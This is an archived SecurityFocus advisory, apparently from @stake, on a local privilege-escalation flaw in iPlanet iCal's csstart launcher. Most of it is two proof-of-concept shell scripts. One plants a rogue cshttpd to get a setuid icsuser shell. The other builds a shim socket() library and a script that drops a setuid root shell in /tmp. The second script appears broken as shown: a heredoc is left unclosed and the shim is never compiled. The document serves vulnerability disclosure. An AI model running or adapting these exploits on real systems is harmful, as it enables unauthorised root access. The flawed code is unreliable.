source: http://www.securityfocus.com/bid/1769/info

Netscape's iPlanet iCal application is a network based calendar service built for deployment in organizations which require a centralized calendar system. Certain versions of iCal ship with a vulnerability in /opt/SUNWicsrv/cal/bin/csstart program. This program is designed to launch the 'cshttpd' server which is the web based interface for the iCal product. 

The problem lies in that the 'csstart' program when run attempts by default to launch cshttpd out of the directory the user is in when they issue the command. Therefore, if a malicious user creates their own cshttpd in the directory from which they launch the csstart the fake server which be launched as opposed to the actual service. This rogue service is effectively launched as the user icsuser and allows the attacker to issue commands as such. Because this user ID owns the iCal directories and files the attacker may user to leverage the attack to root privileges. The example given in the @ Stake advisory is for a user to place shim libraries in the iCal library directory to have the csstart binary retain it's setuid privileges as opposed to dropping them as it is designed to.

Proof of Concept Tools:

There are two scripts below, the first obtains an icsuser shell.
The second script is used to obtain root access the next time iCal is
stopped or started. The second script should be run once you've obtained
the shell and have become the icsuser. This second script creates a shim
libsocket.so.1 library with a modified socket() function that then
executes a shell script as root.

[begin: obtain-ics.sh]
#!/bin/sh
#
# Simple proof of concept exploit used to obtain icsuser shell.
#
# -sili@atstake.com
#
INSTDIR=`cat /etc/iplncal.conf`

cat > cshttpd << FOOFOO
#!/bin/sh
cp /usr/bin/ksh ./icsuser
chmod 4755 ./icsuser
FOOFOO

chmod 755 ./cshttpd

echo "Executing csstart...."
$INSTDIR/cal/bin/csstart -v -p 1 -a 2 2>/dev/null

sleep 1
ls -al ./icsuser
[end: obtain-ics.sh]


[begin: obtain-root.sh]
#!/bin/sh
#
# Simple iCal exploit. Become icsuser by running the shell created with
# the
# obtain-ics.sh script, and then run this shell script. The next time that
# the
# service is started by root (ie. system reboot), a root owned suid shell
# will
# be created: /tmp/r00tshell. 
#
# -sili@atstake.com
#

INSTDIR=`cat /etc/iplncal.conf`

#######
#Create the shim library..

cat > libsushi.c << FOEFOE
/* libsushi
compile: gcc -shared -nostartfiles -nostdlib -fPIC -o libsushi
libsushi.c
*/
#include <unistd.h>
int socket(void)
{
setuid(0);
execl("./icalroot","icalroot",0);
return 0;
}
FOEFOE

#####
#create the shell script we'll be executing as root..

cat > $INSTDIR/cal/bin/icalroot << FOOFOO
#!/bin/sh
cp /usr/bin/ksh /tmp/r00tshell
chmod 4755 /tmp/r00tshell
rm $INSTDIR/cal/bin/icalroot
rm $INSTDIR/cal/bin/libsocket.so.1
ls -l $INSTDIR/cal/bin/icalroot

echo ".. Now wait for the iCal service to start up again"
[end: obtain-root.sh]


For more advisories: http://www.atstake.com/research/advisories/
PGP Key: http://www.atstake.com/research/pgp_key.asc